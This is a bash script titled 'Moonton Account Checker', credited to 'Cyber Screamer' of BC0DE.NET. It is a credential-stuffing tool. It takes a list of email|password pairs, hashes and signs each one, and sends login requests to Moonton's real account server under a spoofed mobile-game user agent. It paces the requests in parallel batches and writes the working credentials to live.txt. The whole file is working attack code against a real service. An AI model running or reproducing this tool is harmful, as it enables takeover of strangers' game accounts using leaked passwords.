#!/bin/bash

cat << "EOF"
	 ____   ____ ___  ____  _____   _   _ _____ _____ 
	| __ ) / ___/ _ \|  _ \| ____| | \ | | ____|_   _|
	|  _ \| |  | | | | | | |  _|   |  \| |  _|   | |  
	| |_) | |__| |_| | |_| | |___ _| |\  | |___  | |  
	|____/ \____\___/|____/|_____(_)_| \_|_____| |_|  

		Moonton Account Checker
		Code By Cyber Screamer | CyberScreamer@bc0de.net
		Thank\'s To Lestravo Mahasiswa Tersakiti & Sikuder 

EOF

function ngecek(){
	local CY='\e[36m'
	local GR='\e[34m'
	local OG='\e[92m'
	local WH='\e[37m'
	local RD='\e[31m'
	local YL='\e[33m'
	local BF='\e[34m'
	local DF='\e[39m'
	local OR='\e[33m'
	local PP='\e[35m'
	local B='\e[1m'
	local CC='\e[0m'
	local md5pwd=$(echo -n ${2} | md5sum | awk '{ print $1 }')
	local sign=$(echo -n "account="${1}"&md5pwd="${md5pwd}"&op=login" | md5sum | awk '{ print $1 }')
	local postdata="{\"op\":\"login\",\"sign\":\"${sign}\",\"params\":{\"account\":\"${1}\",\"md5pwd\":\"${md5pwd}\"},\"lang\":\"en\"}"
	local result=$(curl -s "http://accountgm.moonton.com:37001" \
	-A "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36" \
	-H "X-Requested-With: com.mobile.legends" \
	-d "${postdata}")
	local TIME=$(date +"%T");
	local STATUS=$(echo $result | grep -Po "(?<=message\":\")[^\"]*")
	local SESSION=$(echo $result | grep -Po "(?<=session\":\")[^\"]*")
	local CODE=$(echo $result | grep -Po "(?<=code\":)[^,]*")
	if [[ $STATUS =~ "Error_Success" ]]; then
		printf "[${TIME}] ${OG}${B}LIVE${CC} | Username:${1} Password:${2} => ${YL}[${STATUS}]${CC} ${YL}[${SESSION}]${CC} ${YL}[${CODE}]${CC}\n"
		echo "${1}|${2}" >> live.txt
	elif [[ $STATUS =~ "Error_PasswdError" || $STATUS =~ "Error_NoAccount" ]]; then
		printf "[${TIME}] ${RD}${B}DIE${CC} | Username:${1} Password:${2} => ${YL}[${STATUS}]${CC} ${YL}[${CODE}]${CC}\n"
		echo "${1}|${2}" >> die.txt
	else
		printf "[${TIME}] ${CY}${B}UNK${CC} | Username:${1} Password:${2} => ${YL}[${STATUS}]${CC} ${YL}[${CODE}]${CC}\n"
		echo "${1}|${2}" >> unk.txt
	fi
}

# CHECK SPECIAL VAR FOR MAILIST
if [[ -z $1 ]]; then
	printf "To Use $0 <mailist.txt> \n"
	exit 1
fi

# RATIO
persend=5
setleep=2

IFS=$'\r\n' GLOBIGNORE='*' command eval 'mailist=($(cat $1))'
itung=1

for (( i = 0; i < ${#mailist[@]}; i++ )); do
	username="${mailist[$i]}"
	IFS='|' read -r -a array <<< "$username"
	email=${array[0]}
	password=${array[1]}
	set_kirik=$(expr $itung % $persend)

    if [[ $set_kirik == 0 && $itung > 0 ]]; then
    	wait
    	printf "=== Sleep for ${setleep}s [BC0DE.NET/CyberScreamer]===\n"
        sleep $setleep
    fi

    ngecek "${email}" "${password}" &
	itung=$[$itung+1]
done
wait
